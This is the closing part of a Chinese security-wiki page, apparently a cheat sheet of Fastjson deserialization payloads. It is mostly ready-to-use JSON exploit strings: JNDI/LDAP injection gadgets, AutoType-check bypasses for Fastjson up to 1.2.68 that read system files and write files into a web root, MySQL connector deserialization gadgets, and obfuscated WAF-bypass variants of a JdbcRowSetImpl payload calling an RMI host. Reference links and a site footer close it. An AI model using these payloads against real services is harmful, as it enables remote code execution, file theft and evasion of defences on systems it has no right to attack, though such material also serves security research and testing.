style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">json</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-json">{&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: {&quot;$ref&quot;:&quot;$.tm&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">{&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:{&quot;$ref&quot;:&quot;$.instance&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> fastjson&lt;=1.2.68 </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Fastjson &lt;= 1.2.68；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: {&quot;$ref&quot;:&quot;$.value&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">json</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-json">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">读文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">json</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-json">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">写文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">json</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-json">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    &quot;stream&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    &quot;writer&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;buffer&quot;: &quot;cHduZWQ=&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;outputStream&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;position&quot;: 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    &quot;close&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        &quot;out&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-json">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">写文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;stream&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;file&#x27;:&#x27;/tmp/nonexist&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;append&#x27;:false</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;writer&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&#x27;org.apache.solr.common.util.FastOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;tempBuffer&#x27;:&#x27;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;sink&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &#x27;$ref&#x27;:&#x27;$.stream&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;start&#x27;:38</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;close&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&#x27;org.iq80.snappy.SnappyOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;out&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &#x27;$ref&#x27;:&#x27;$.writer&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">适用于jdk8/10的</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;out&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;out&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &#x27;file&#x27;:&#x27;dst&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &#x27;append&#x27;:false</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;infl&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &#x27;input&#x27;:&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &#x27;bufLen&#x27;:1048576</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &#x27;protocolVersion&#x27;:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2021黑帽大会腾讯玄武披露   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">详细漏洞原理待研究</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">Mysqlconnector 5.1.x</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;mysql.host&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:{&quot;user&quot;:”user&quot;,&quot;password&quot;:”pass&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;: &quot;1&quot;},&quot;databaseToConnectTo&quot;:”dbname&quot;,&quot;url&quot;:&quot;&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Mysqlconnector 6.0.2 or 6.0.3</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,&quot;proxy&quot;:{&quot;connectionString&quot;:{&quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;}}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Mysqlconnector 6.x or &lt; 8.0.20</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,&quot;proxy&quot;:{&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,&quot;connectionUrl&quot;:{&quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;: [{&quot;host&quot;:&quot;mysql.host&quot;}], &quot;slaves&quot;:[], &quot;properties&quot;:{&quot;host&quot;:&quot;mysql.host&quot;,&quot;user&quot;:&quot;user&quot;,&quot;dbname&quot;:&quot;dbname&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;}}}}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> fastjson未知版本</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">待探索</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: {&quot;$ref&quot;:&quot;$.transactionManager&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: {&quot;$ref&quot;:&quot;$.transactionManager&quot;}}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> bypasswaf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fastjson默认会去除键、值外的空格、</span><span class="token code-snippet code keyword" style="color:#00009f">`\b`</span><span class="token plain">、</span><span class="token code-snippet code keyword" style="color:#00009f">`\n`</span><span class="token plain">、</span><span class="token code-snippet code keyword" style="color:#00009f">`\r`</span><span class="token plain">、</span><span class="token code-snippet code keyword" style="color:#00009f">`\f`</span><span class="token plain">等，同时还会自动将键与值进行unicode与十六进制解码。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{/*s6*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{\n&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;\b:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}  {&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考链接">参考链接<a href="#参考链接" class="hash-link" aria-label="参考链接的直接链接" title="参考链接的直接链接">​</a></h2>
<ul>
<li><a href="https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/" target="_blank" rel="noopener noreferrer">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="https://yyz9.cn/2021/08/07/fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener noreferrer">Fastjson反序列化漏洞分析</a></li>
<li><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener noreferrer">Fastjson 反序列化漏洞史</a></li>
<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener noreferrer">FastJson 反序列化学习</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T04:26:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson的dnslog探测方式分析"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Fastjson的dnslog探测方式分析</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson1.2.68分析"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Fastjson1.2.68分析</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前言" class="table-of-contents__link toc-highlight">前言</a></li><li><a href="#概念" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#演示代码" class="table-of-contents__link toc-highlight">演示代码</a></li><li><a href="#fastjson-1224" class="table-of-contents__link toc-highlight">fastjson 1.2.24</a></li><li><a href="#fastjson-1241" class="table-of-contents__link toc-highlight">fastjson 1.2.41</a></li><li><a href="#fastjson-1242" class="table-of-contents__link toc-highlight">fastjson 1.2.42</a></li><li><a href="#fastjson-1243" class="table-of-contents__link toc-highlight">fastjson 1.2.43</a></li><li><a href="#fastjson-1245" class="table-of-contents__link toc-highlight">fastjson 1.2.45</a></li><li><a href="#fastjson-1247" class="table-of-contents__link toc-highlight">fastjson 1.2.47</a></li><li><a href="#fastjson-1262" class="table-of-contents__link toc-highlight">fastjson 1.2.62</a></li><li><a href="#fastjson-1266" class="table-of-contents__link toc-highlight">fastjson 1.2.66</a></li><li><a href="#fastjson-1268" class="table-of-contents__link toc-highlight">fastjson 1.2.68</a></li><li><a href="#fastjson黑名单" class="table-of-contents__link toc-highlight">fastjson黑名单</a></li><li><a href="#payload转换" class="table-of-contents__link toc-highlight">Payload转换</a></li><li><a href="#fastjson姿势技巧集合" class="table-of-contents__link toc-highlight">Fastjson姿势技巧集合</a></li><li><a href="#参考链接" class="table-of-contents__link toc-highlight">参考链接</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li 